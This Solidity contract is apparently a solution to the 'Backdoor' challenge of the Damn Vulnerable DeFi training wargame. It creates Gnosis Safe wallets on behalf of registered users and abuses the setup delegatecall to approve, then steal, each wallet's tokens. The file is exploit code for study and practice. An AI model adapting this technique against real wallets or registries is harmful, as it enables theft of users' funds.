// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "./DamnValuableToken.sol";
import "hardhat/console.sol";

interface InterfaceProxyCreationCallback {
    function proxyCreated(
        GnosisSafeProxy proxy,
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external;
}

contract Attack {
    IProxyCreationCallback private walletRegistry;
    address private proxyFactory;
    address private gnosisSafe;
    address private attacker;
    DamnValuableToken private token;

    constructor(
        address _walletRegistry,
        address _proxyFactory,
        address _gnosisSafe,
        address _attacker,
        address _token
    ) {
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        proxyFactory = _proxyFactory;
        gnosisSafe = _gnosisSafe;
        attacker = _attacker;
        token = DamnValuableToken(_token);
    }

    //function will be called at setup from GnosisSafe proxy contract using deletegate call
    function approveToken(address addressToken, address attackerContract)
        public
    {
        uint256 balance = DamnValuableToken(addressToken).balanceOf(msg.sender);
        (bool result, bytes memory error) = addressToken.call(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attackerContract,
                10 ether
            )
        );
    }

    function attack(address[] calldata users) public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            //function that we will have the module call at setup
            bytes memory transferFunc = abi.encodeWithSignature(
                "approveToken(address,address)",
                address(token),
                address(this)
            );
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                transferFunc,
                address(0),
                0,
                address(0)
            );
            //deploy proxy contract and have callback call proxycCreated() from WalletRegistry contract
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(proxyFactory)
                .createProxyWithCallback(
                    gnosisSafe,
                    initializer,
                    i,
                    walletRegistry
                );
            //transfer the 10 tokens that were approved at set up
            token.transferFrom(address(proxy), attacker, 10 ether);
        }
    }
}
